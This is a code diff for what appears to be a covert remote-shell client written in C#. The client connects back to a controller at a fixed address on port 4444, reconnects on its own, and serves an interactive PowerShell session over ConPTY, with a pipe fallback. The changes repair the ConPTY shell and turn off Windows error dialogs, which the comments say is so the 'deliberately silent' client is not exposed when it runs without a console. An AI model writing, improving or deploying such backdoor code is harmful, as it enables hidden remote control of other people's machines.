@@ -65,7 +65,7 @@ public static class Cfg
     public const string Http = "http";
     public const string Https = "https";
 
-    public const string DefaultIp = "https://omarchy.taile8340b.ts.net";
+    public const string DefaultIp = "192.168.0.113";
     public const int DefaultPort = 4444;
     public const int RetryDelay = 1;                 // seconds between reconnect attempts
     public const int ReconnectDelayMs = 500;         // after an established link drops
@@ -5766,24 +5766,58 @@ public static class Shell
 
     private static void ShellWindows(Conn sock, int rows, int cols)
     {
-        if (Platform.IsWindows)
+        // The client is deliberately silent on Windows and is often started
+        // without a console.  A child that cannot attach to its console (the
+        // documented ConPTY failure, 0xc0000142) would otherwise raise a
+        // modal hard-error dialog that blocks the client and exposes it.
+        // Suppress those dialogs for the whole shell session; the child
+        // inherits this mode, and the controller still gets a diagnostic on
+        // the shell channel.
+        var suppressDialogs = Platform.IsWindows;
+        var oldErrorMode = 0u;
+        if (suppressDialogs)
+            oldErrorMode = Win32Kernel.SetErrorMode(
+                Win32Kernel.SEM_FAILCRITICALERRORS |
+                Win32Kernel.SEM_NOGPFAULTERRORBOX |
+                Win32Kernel.SEM_NOOPENFILEERRORBOX);
+        try
         {
+            void Notice(string text)
+            {
+                try { SendOutputText(sock, text); } catch { }
+            }
+            if (Platform.IsWindows)
+            {
+                try
+                {
+                    if (ShellWindowsConPty(sock, rows, cols)) return;
+                    Notice("\r\n[client] ConPTY shell exited during startup; using the pipe fallback.\r\n");
+                }
+                catch (Exception ex)
+                {
+                    var reason = string.IsNullOrEmpty(ex.Message) ? ex.GetType().Name : ex.Message;
+                    Log.Error($"[!] ConPTY shell failed ({reason}); using the pipe fallback.");
+                    Notice($"\r\n[client] ConPTY unavailable: {reason}\r\n");
+                }
+            }
             try
             {
-                ShellWindowsConPty(sock, rows, cols);
-                return;
+                ShellWindowsPipes(sock);
             }
             catch (Exception ex)
             {
                 var reason = string.IsNullOrEmpty(ex.Message) ? ex.GetType().Name : ex.Message;
-                Log.Error($"[!] ConPTY shell failed ({reason}); using the pipe fallback.");
-                SendOutputText(sock, $"\r\n[client] ConPTY unavailable: {reason}\r\n");
+                Log.Error($"[!] pipe shell failed ({reason}).");
+                Notice($"\r\n[client] shell failed: {reason}\r\n");
             }
         }
-        ShellWindowsPipes(sock);
+        finally
+        {
+            if (suppressDialogs) Win32Kernel.SetErrorMode(oldErrorMode);
+        }
     }
 
-    private static void ShellWindowsConPty(Conn sock, int rows, int cols)
+    private static bool ShellWindowsConPty(Conn sock, int rows, int cols)
     {
         var k32 = Win32Kernel.Instance;
         var shell = Platform.Which("powershell.exe");
@@ -5801,6 +5835,11 @@ public static class Shell
         var si = new STARTUPINFOEX();
         var pi = new PROCESS_INFORMATION();
         var stage = "starting";
+        var startedAt = DateTime.UtcNow;
+        var endedAt = startedAt;
+        long outputBytes = 0;
+        var controllerClosed = false;
+        uint exitCode = 0;
         try
         {
             stage = "CreatePipe(input)";
@@ -5823,11 +5862,13 @@ public static class Shell
             if (!Win32Kernel.InitializeProcThreadAttributeList(attrBuf, 1, 0, ref needed))
                 throw new IOException("InitializeProcThreadAttributeList: " + Win32Kernel.LastError());
             stage = "UpdateProcThreadAttribute";
-            // lpValue must point AT the pseudoconsole handle, so it is
-            // ref hPC; passing the handle value itself made the attribute
-            // call corrupt memory / fail and quietly pushed every Windows
-            // shell into the pipe fallback.
-            if (!Win32Kernel.UpdateProcThreadAttribute(attrBuf, 0, (IntPtr)0x00020016, ref hpc,
+            // PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE takes the HPCON value
+            // itself, exactly like the official MiniTerm sample and the
+            // Python client.  Passing &hpc makes CreateProcess treat the
+            // address of this local variable as the pseudoconsole handle;
+            // the child then cannot attach to its console and exits with
+            // STATUS_DLL_INIT_FAILED (0xc0000142, the popup).
+            if (!Win32Kernel.UpdateProcThreadAttribute(attrBuf, 0, (IntPtr)0x00020016, hpc,
                     (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                 throw new IOException("UpdateProcThreadAttribute: " + Win32Kernel.LastError());
 
@@ -5852,6 +5893,7 @@ public static class Shell
             var cmdline = new StringBuilder($"\"{app}\"{args}");
             stage = "CreateProcessW";
             var flags = 0x00080000u | 0x00000400u; // EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT
+            startedAt = DateTime.UtcNow;
             if (!Win32Kernel.CreateProcessW(app, cmdline, IntPtr.Zero, IntPtr.Zero, false,
                     flags, envBlock, null, ref si, out pi))
                 throw new IOException("CreateProcessW: " + Win32Kernel.LastError());
@@ -5883,6 +5925,7 @@ public static class Shell
                 {
                     if (!Win32Kernel.ReadFile(outRead, buffer, (uint)buffer.Length, out var read, IntPtr.Zero)
                         || read == 0) break;
+                    Interlocked.Add(ref outputBytes, (int)read);
                     var copy = new byte[read];
                     Buffer.BlockCopy(buffer, 0, copy, 0, (int)read);
                     if (!SendOutput(sock, copy, copy.Length)) break;
@@ -5931,7 +5974,7 @@ public static class Shell
                 }
                 var n = sock.Read(buffer, 0, buffer.Length, 200);
                 if (n < 0) continue;
-                if (n == 0) break;
+                if (n == 0) { controllerClosed = true; break; }
                 var copy = new byte[n];
                 Buffer.BlockCopy(buffer, 0, copy, 0, n);
                 writer.Send(copy);
@@ -5940,11 +5983,13 @@ public static class Shell
         catch { }
         finally
         {
+            endedAt = DateTime.UtcNow;
             stop.Set();
             try { writer?.Close(); } catch { }
             try { helper?.Close(); } catch { }
             try { Win32Kernel.TerminateProcess(pi.hProcess, 1); } catch { }
             try { Win32Kernel.WaitForSingleObject(pi.hProcess, 1000); } catch { }
+            try { Win32Kernel.GetExitCodeProcess(pi.hProcess, out exitCode); } catch { }
             try { if (hpc != IntPtr.Zero) Win32Kernel.ClosePseudoConsole(hpc); } catch { }
             try { reader.Join(1000); } catch { }
             Win32Kernel.CloseHandle(inWrite);
@@ -5954,6 +5999,19 @@ public static class Shell
             if (attrBuf != IntPtr.Zero) Win32Kernel.DeleteProcThreadAttributeList(attrBuf);
             if (envBlock != IntPtr.Zero) Marshal.FreeHGlobal(envBlock);
         }
+
+        // A ConPTY child that dies immediately without producing a single
+        // byte never attached to the pseudoconsole (the documented failure
+        // that shows 0xc0000142).  Do not leave the controller with an empty
+        // shell channel: report the failure and use the pipe fallback.
+        var startupFailure = !controllerClosed
+            && (exitCode == 0xC0000142u
+                || (Interlocked.Read(ref outputBytes) == 0
+                    && (endedAt - startedAt).TotalSeconds < 3.0));
+        if (startupFailure)
+            Log.Error("[!] ConPTY shell exited during startup (0x"
+                + exitCode.ToString("x8") + "); using the pipe fallback.");
+        return !startupFailure;
     }
 
     private static void ShellWindowsPipes(Conn sock)
@@ -6437,6 +6495,15 @@ public static class Shell
         private static readonly Lazy<Win32Kernel> LazyInstance = new(() => new Win32Kernel());
         public static Win32Kernel Instance => LazyInstance.Value;
 
+        // Error modes that stop Windows from raising modal hard-error
+        // dialogs for a child that fails during process startup.
+        public const uint SEM_FAILCRITICALERRORS = 0x0001;
+        public const uint SEM_NOGPFAULTERRORBOX = 0x0002;
+        public const uint SEM_NOOPENFILEERRORBOX = 0x8000;
+
+        [DllImport("kernel32.dll")]
+        public static extern uint SetErrorMode(uint mode);
+
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern int GetCurrentThreadId();
 
@@ -6464,7 +6531,7 @@ public static class Shell
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool UpdateProcThreadAttribute(IntPtr list, uint flags,
-            IntPtr attribute, ref IntPtr value, IntPtr size, IntPtr previous, IntPtr returned);
+            IntPtr attribute, IntPtr value, IntPtr size, IntPtr previous, IntPtr returned);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern void DeleteProcThreadAttributeList(IntPtr list);
@@ -6485,6 +6552,9 @@ public static class Shell
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool TerminateProcess(IntPtr process, uint exitCode);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool GetExitCodeProcess(IntPtr process, out uint exitCode);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
